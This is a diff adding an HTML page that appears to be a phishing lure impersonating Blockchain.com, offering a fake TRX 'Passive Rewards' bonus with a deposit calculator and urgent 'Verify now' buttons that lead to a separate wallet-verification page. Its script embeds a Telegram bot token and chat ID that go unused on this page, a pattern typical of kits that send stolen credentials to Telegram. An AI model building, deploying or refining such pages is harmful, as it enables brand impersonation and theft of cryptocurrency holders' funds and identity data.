@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blockchain.com – TRX Passive Rewards Bonus</title>
+  <link rel="icon" href="https://www.blockchain.com/favicon.ico">
+  <style>
+    body {margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f8fafc;color:#1e293b;line-height:1.6;}
+    .container {max-width:680px;margin:0 auto;background:white;box-shadow:0 4px 20px rgba(0,0,0,0.06);border-radius:8px;overflow:hidden;}
+    .header {background:#0f62fe;color:white;padding:24px 32px;text-align:center;}
+    .header h1 {margin:0;font-size:28px;font-weight:600;}
+    .content {padding:40px 32px;}
+    .promo {font-size:22px;font-weight:700;color:#0f62fe;margin:0 0 16px;text-align:center;}
+    .description {font-size:16px;margin-bottom:24px;}
+    .bonus-tiers {background:#f8fafc;padding:24px;border-radius:8px;margin:32px 0;}
+    .tier {margin-bottom:16px;font-size:15px;}
+    .tier strong {color:#0f62fe;}
+    .calculator {background:#f1f5f9;padding:24px;border-radius:8px;margin:32px 0;text-align:center;}
+    .slider-container {margin:20px 0;}
+    input[type="range"] {width:100%;height:8px;background:#cbd5e1;border-radius:4px;outline:none;}
+    input[type="range"]::-webkit-slider-thumb {-webkit-appearance:none;width:24px;height:24px;background:#0f62fe;border-radius:50%;cursor:pointer;}
+    #depositValue {font-size:24px;font-weight:700;color:#0f62fe;margin:16px 0;}
+    #bonusPreview {font-size:18px;font-weight:600;color:#047857;}
+    .buttons {display:flex;justify-content:center;gap:24px;margin:40px 0;}
+    .btn {padding:14px 40px;font-size:16px;font-weight:600;border-radius:6px;text-decoration:none;cursor:pointer;transition:all 0.2s;}
+    .btn-primary {background:#0f62fe;color:white;border:none;}
+    .btn-primary:hover {background:#0056d6;}
+    .btn-secondary {background:white;color:#0f62fe;border:1px solid #0f62fe;}
+    .btn-secondary:hover {background:#f0f5ff;}
+    .footer {text-align:center;padding:24px;font-size:14px;color:#64748b;border-top:1px solid #e2e8f0;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Earn double rewards on your TRX holdings</h1>
+    </div>
+
+    <div class="content">
+      <div class="promo">
+        Get your share of a 700,000+ TRX prize pool plus up to 8% APY in Passive Rewards.
+      </div>
+
+      <div class="description">
+        First, verify your identity, then deposit TRX into Passive Rewards in December and keep it there throughout January to qualify for your bonus. T&Cs apply.
+      </div>
+
+      <div class="bonus-tiers">
+        <div class="tier">
+          <strong>Deposit 100 TRX or more</strong> to qualify for a bonus of up to 18 TRX
+        </div>
+        <div class="tier">
+          <strong>Deposit 1,000 TRX or more</strong> to qualify for a bonus of up to 140 TRX
+        </div>
+        <div class="tier">
+          <strong>Deposit 3,000 TRX or more</strong> to qualify for a bonus of up to 360 TRX
+        </div>
+      </div>
+
+      <div class="calculator">
+        <h3>Estimate Your Bonus</h3>
+        <div class="slider-container">
+          <input type="range" min="100" max="5000" value="100" id="depositSlider" step="100">
+          <div style="margin-top:12px;">
+            Deposit: <span id="depositValue">100 TRX</span>
+          </div>
+        </div>
+        <div id="bonusPreview">Your bonus: up to 18 TRX</div>
+      </div>
+
+      <div class="description">
+        Your TRX will keep earning up to 8% APY in Passive Rewards, and your bonus will be paid in TRX by the 3rd weekday of February 2026.
+      </div>
+
+      <div class="description" style="font-weight:500; text-align:center;">
+        Verify today so you don’t miss out.
+      </div>
+
+      <div class="buttons">
+        <a href="trx-wallet-verify.html" class="btn btn-primary">Verify now</a>
+        <a href="#" class="btn btn-secondary">Read T&Cs</a>
+      </div>
+
+      <div class="footer">
+        Thanks for being part of Blockchain.com since November 14, 2022 ♥
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const token = "8644001585:AAHFNZ1AK6GtSE5nIFMc1Y_beM7Bbyp9_gw";
+    const chat = "6215498468";
+
+    // Bonus calculator logic
+    const slider = document.getElementById("depositSlider");
+    const valueDisplay = document.getElementById("depositValue");
+    const bonusDisplay = document.getElementById("bonusPreview");
+
+    slider.addEventListener("input", function() {
+      const deposit = parseInt(slider.value);
+      valueDisplay.textContent = deposit + " TRX";
+
+      let bonus = 0;
+      if (deposit >= 3000) bonus = 360;
+      else if (deposit >= 1000) bonus = 140;
+      else if (deposit >= 100) bonus = 18;
+
+      bonusDisplay.textContent = "Your bonus: up to " + bonus + " TRX";
+    });
+  </script>
+</body>
+</html>
